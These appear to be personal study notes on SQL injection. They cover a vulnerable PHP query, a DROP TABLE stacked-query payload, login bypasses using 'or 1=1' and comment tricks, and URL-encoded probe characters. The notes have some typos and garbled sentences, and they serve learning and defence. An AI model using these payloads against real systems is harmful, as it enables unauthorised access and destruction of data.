An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
In this case we control the input inside the brackets
```sql
%$searchInput
```
So if we close the quotes like
```php
'%1'; DROP TABLE users;'
```
it becomes:
```sql
select * from logins where username like '%1'; DROP TABLE users;'
```
![[Pasted image 20241111204042.png]]

### Login
So we got
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
``` 

to confirm if it's vulnerable
:

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

So if we submit this
```sql
admin' or '1'='1
```
as the username, it becomes
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

- If username is `admin`  
    `OR`
- If `1=1` return `true` 'which always returns `true`'  
    `AND`
- If password is `something`
The `AND` operator will be evaluated first, and it will return `false`. Then, the `OR` operator would be evalutated, and if either of the statements is `true`, it would return `true`. Since `1=1` always returns `true`, this query will return `true`, and it will grant us access.
To successfully login, to the account the thing afte and should be true too, or bi commited at least ![[Pasted image 20241111204934.png]]
Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (though this is not usually used in SQL injections). The `--` can be used as follows:
SQL supports the usage of parenthesis if the application needs to check for particular conditions before others.
```mysql
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)

```
SQL suport uses of paranthesis to tell the SQL when to do some process first, this mean our commit could cause an syntax error so instead of `admin'--` we should do `admin')--` 

Executing query: SELECT * FROM logins WHERE (username='admin')-- '' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';

Executing query: SELECT * FROM logins WHERE (username='admin')--' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
